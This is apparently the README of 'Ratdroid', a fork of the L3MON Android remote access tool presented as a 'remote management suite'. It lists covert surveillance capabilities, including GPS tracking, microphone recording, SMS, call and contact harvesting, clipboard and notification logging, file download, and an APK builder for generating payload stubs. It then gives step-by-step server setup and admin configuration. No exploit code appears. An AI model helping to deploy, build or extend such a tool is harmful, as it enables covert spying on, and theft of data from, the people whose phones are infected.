# Ratdroid
Ratdroid-Remote Android Managment Suite
Ratdroid is A cloud based remote android managment suite, powered by NodeJS

Features
GPS Logging
Microphone Recording
View Contacts
SMS Logs
Send SMS
Call Logs
View Installed Apps
View Stub Permissions
Live Clipboard Logging
Live Notification Logging
View WiFi Networks (logs previously seen)
File Explorer & Downloader
Command Queuing
Built In APK Builder
Prerequisites
Java Runtime Environment 8
See installation for OS specifics
NodeJs
A Server
Installation
Install JRE 8 (We cannot stress this enough USE java 1.8.0 ANY issues that dont use this will be closed WITHOUT a response)

Debian, Ubuntu, Etc
sudo apt-get install openjdk-8-jre
Fedora, Oracle, Red Hat, etc
su -c "yum install java-1.8.0-openjdk"
Windows
click HERE for downloads
Install NodeJS Instructions Here (If you can't figure this out, you shouldn't really be using this)

install PM2

npm install pm2 -g
Download and Extract the latest release from HERE

In the extracted folder, run these commands

npm install <- install dependencies
pm2 start index.js <-- start the script
pm2 startup <- to run L3MON on startup
Set a Username & Password

Stop L3MON pm2 stop index
Open maindb.json in a text editor
under admin
set the username as plain text
set the password as a LOWERCASE MD5 hash
save the file
run pm2 restart all
in your browser navigate to http://<SERVER IP>:22533

It's recommended to run L3MON behind a reverse proxy such as NGINX

Notes
When opening an issue, you MUST use the provided templates. Issues without this will not recieve support quickly and will be put to the bottom of the figurative pile.

Please have a look through the current issues, open and closed to see if your issue has been addressed before. If it's java related, it's most definitely been addressed - In short Use Java 1.8.0


Credit to L3MON
